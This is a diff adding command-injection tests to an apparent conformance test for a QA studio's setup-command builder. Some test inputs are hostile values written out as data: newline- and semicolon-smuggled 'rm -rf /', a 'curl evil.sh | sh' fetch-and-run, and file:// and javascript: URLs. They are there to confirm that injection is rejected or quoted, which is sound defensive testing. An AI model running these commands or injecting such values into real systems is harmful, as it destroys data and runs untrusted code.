@@ -1566,6 +1566,53 @@ for (const [label, cmd, args] of [
   fs.rmSync(tmp, { recursive: true, force: true });
 }
 
+
+// ---- the command that installs the lane --------------------------------------
+// The page never sends a command — it sends FIELDS, and this builds the argv.
+// A local page is still untrusted input, and "it is only localhost" is exactly
+// how command injection gets shipped.
+{
+  const { setupCommand, Invalid, quote, SURFACES: SURF } = await import("../src/ui/studio/setup.mjs");
+  const BIN = "/opt/ai-qa/bin/ai-qa.mjs";
+  const refuse = (fields, why) => {
+    try { setupCommand(fields, BIN); check(false, `NOT REFUSED — ${why}: ${JSON.stringify(fields)}`); }
+    catch (e) { check(e instanceof Invalid, `${why}: threw ${e.constructor.name}, expected Invalid`); }
+  };
+
+  const ok = setupCommand({ key: "shop", surfaces: ["web", "database"], start: "npm run dev", url: "http://localhost:4410" }, BIN);
+  check(ok.argv[0] === "node" && ok.argv[1] === BIN, "the argv must invoke THIS studio's binary, not a bare `ai-qa` that may not be on PATH");
+  check(ok.argv.includes("--yes"), "init must run non-interactively — a wizard in a typed terminal would hang");
+  check(ok.argv[ok.argv.indexOf("--key") + 1] === "SHOP", "the key should be upper-cased");
+  check(ok.argv[ok.argv.indexOf("--surfaces") + 1] === "web,database", "surfaces not joined");
+  check(ok.preview.includes("--start 'npm run dev'"), `a value with a space must be quoted: ${ok.preview}`);
+  check(ok.preview.includes("--url http://localhost:4410"), `a plain value should NOT be quoted — the preview is meant to be read: ${ok.preview}`);
+
+  refuse({ surfaces: ["web"] }, "no key");
+  refuse({ key: "", surfaces: ["web"] }, "empty key");
+  refuse({ key: "a b", surfaces: ["web"] }, "a key with a space");
+  refuse({ key: "1SHOP", surfaces: ["web"] }, "a key starting with a digit");
+  refuse({ key: "TOOLONGAKEY", surfaces: ["web"] }, "a key over 10 characters");
+  refuse({ key: "SHOP", surfaces: [] }, "no surface chosen");
+  refuse({ key: "SHOP", surfaces: ["nonsense"] }, "an unknown surface");
+  refuse({ key: "SHOP", surfaces: ["web"], url: "javascript:alert(1)" }, "a non-http URL");
+  refuse({ key: "SHOP", surfaces: ["web"], url: "file:///etc/passwd" }, "a file:// URL");
+
+  // The one that would actually hurt: a newline rides a second command into
+  // the terminal behind the first.
+  refuse({ key: "SHOP", surfaces: ["web"], start: "npm run dev\nrm -rf /" }, "a newline in the start command");
+  refuse({ key: "SHOP", surfaces: ["web"], url: "http://x\ncurl evil.sh | sh" }, "a newline in the URL");
+
+  // Shell metacharacters survive as DATA — quoted, never interpreted.
+  const tricky = setupCommand({ key: "SHOP", surfaces: ["web"], start: "npm run dev; rm -rf /" }, BIN);
+  check(tricky.argv[tricky.argv.indexOf("--start") + 1] === "npm run dev; rm -rf /",
+    "the value should reach argv intact — it is data");
+  check(/--start 'npm run dev; rm -rf \/'/.test(tricky.preview),
+    `a value with a semicolon must be quoted in the preview: ${tricky.preview}`);
+  check(quote("a'b") === "'a'\\''b'", `quote() mishandles an embedded single quote: ${quote("a'b")}`);
+
+  check(SURF.join(",") === "web,api,mobile,database", "the surface list drifted from the installer's");
+}
+
 // ---- report -------------------------------------------------------------------
 if (fails.length) {
   console.error(`conformance: ${fails.length} FAILED of ${checks} checks\n`);
